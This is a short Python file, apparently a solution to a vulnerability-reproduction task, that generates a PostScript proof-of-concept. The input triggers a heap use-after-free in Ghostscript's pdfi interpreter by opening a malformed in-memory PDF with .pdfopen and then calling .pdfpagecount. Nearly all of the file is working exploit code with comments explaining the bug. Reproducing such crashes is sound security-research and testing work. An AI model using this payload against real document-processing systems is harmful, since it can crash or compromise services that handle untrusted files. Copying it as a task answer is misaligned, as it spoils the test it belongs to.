import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Use-After-Free in Ghostscript's pdfi interpreter.
        # It occurs when a pdfi context is created with a stream that fails initialization
        # (e.g., malformed PDF), but the context is still returned with a dangling or null stream pointer.
        # Accessing this context with other operators triggers the crash.
        
        # We construct a minimal PostScript file that:
        # 1. Defines a malformed PDF (valid header, garbage body) in memory.
        # 2. Creates a seekable stream from it using /ReusableStreamDecode.
        # 3. Attempts to open it with .pdfopen.
        # 4. If successful (vulnerable), calls .pdfpagecount on the returned context to trigger the UAF.
        
        # Malformed PDF payload: Header to pass initial signature check, followed by garbage.
        pdf_payload = b"%PDF-1.7\n" + b"\x90" * 256
        pdf_hex = pdf_payload.hex()
        
        # PostScript Proof-of-Concept
        poc = f"""%!PS
/pdf_data <{pdf_hex}> def
/s pdf_data /ReusableStreamDecode filter def
{{
    s .pdfopen
    % If we reach here, the vulnerable version returned a context despite the broken stream.
    % .pdfpagecount attempts to read from the stream, triggering the UAF.
    dup .pdfpagecount
    pop
}} stopped
quit
"""
        return poc.encode('utf-8')